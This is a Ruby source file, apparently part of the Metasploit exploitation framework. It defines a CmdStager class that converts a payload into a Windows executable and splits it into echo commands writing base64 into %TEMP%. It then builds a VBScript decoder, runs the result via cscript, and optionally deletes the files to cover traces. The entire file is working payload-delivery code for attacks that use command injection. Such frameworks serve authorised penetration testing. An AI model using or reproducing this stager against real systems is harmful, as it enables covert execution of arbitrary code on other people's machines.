require 'rex/text'
require 'rex/arch'
require 'msf/core/framework'

module Rex
module Exploitation

###
#
# This class provides an interface to generating cmdstagers.
#
###

class CmdStager

	def initialize(payload, framework, platform, arch = nil)
		@var_decoder = Rex::Text.rand_text_alpha(5)
		@var_encoded = Rex::Text.rand_text_alpha(5)
		@var_batch   = Rex::Text.rand_text_alpha(5)
		@decoder	    =	File.join(Msf::Config.install_root, "data", "exploits", "cmdstager", "decoder_stub") # need error checking here
		@framework   =	framework
		@linelen     = 2047 # covers most likely cases

		# XXX: TODO: support multipl architectures/platforms
		@exe	       = Msf::Util::EXE.to_win32pe(@framework, payload.encoded)
	end


	#
	# Generates the cmd payload including the h2bv2 decoder and encoded payload.
	# The resulting commands also perform cleanup, removing any left over files
	#
	def generate(opts = {}, linelen = 200)
		@linelen = linelen

		# Return the output from payload_exe
		payload_exe(opts)
	end


	#
	# This does the work of actually building an array of commands that
	# when executed will create and run an executable payload.
	#
	def payload_exe(opts)

		persist = opts[:persist]

		# Initialize an arry of commands to execute
		cmds = []

		# Add the exe building commands (write to .b64)
		cmds += encode_payload()

		# Add the decoder script building commands
		cmds += generate_decoder()

		# Make it all happen
		cmds << "cscript //nologo %TEMP%\\#{@var_decoder}.vbs"

		# If we're not persisting, clean up afterwards
		if (not persist)
			cmds << "del %TEMP%\\#{@var_decoder}.vbs"
			cmds << "del %TEMP%\\#{@var_encoded}.b64"
		end

		# Compress commands into as few lines as possible.
		new_cmds = []
		line = ''
		cmds.each { |cmd|
			# If this command will fit...
			if ((line.length + cmd.length + 4) < @linelen)
				line << " & " if line.length > 0
				line << cmd
			else
				# It won't fit.. If we don't have something error out
				if (line.length < 1)
					raise RuntimeError, 'Line fit problem -- file a bug'
				end
				# If it won't fit even after emptying the current line, error out..
				if (cmd.length > @linelen)
					raise RuntimeError, 'Line too long - %d bytes' % cmd.length
				end
				new_cmds << line
				line = ''
				line << cmd
			end
		}
		new_cmds << line if (line.length > 0)

		# Return the final array.
		new_cmds
	end


	def generate_decoder()
		# Read the decoder data file
		f = File.new(@decoder, "rb")
		decoder = f.read(f.stat.size)
		f.close

		# Replace variables
		decoder.gsub!(/decode_stub/, "%TEMP%\\#{@var_decoder}.vbs")
		decoder.gsub!(/ENCODED/, "%TEMP%\\#{@var_encoded}.b64")
		decoder.gsub!(/DECODED/, "%TEMP%\\#{@var_batch}.exe")

		# Split it apart by the lines
		decoder.split("\n")
	end


	def encode_payload()
		tmp = Rex::Text.encode_base64(@exe)
		orig = tmp.dup

		cmds = []
		l_start = "echo "
		l_end   = ">>%TEMP%\\#{@var_encoded}.b64"
		xtra_len = l_start.length + @var_encoded.length + l_end.length + 1
		while (tmp.length > 0)
			cmd = ''
			cmd << l_start
			cmd << tmp.slice!(0, (@linelen - xtra_len))
			cmd << l_end
			cmds << cmd
		end

		cmds
	end

end
end
end
